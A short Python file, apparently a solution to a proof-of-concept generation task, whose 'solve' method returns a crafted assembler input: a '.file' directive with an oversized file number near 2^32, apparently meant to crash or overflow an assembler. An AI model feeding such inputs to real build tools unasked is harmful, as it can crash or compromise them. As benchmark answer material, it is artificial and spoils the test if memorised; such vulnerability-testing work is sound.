import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'.file 4294967289 "xxx.c"\n.text\n\n'
        return poc
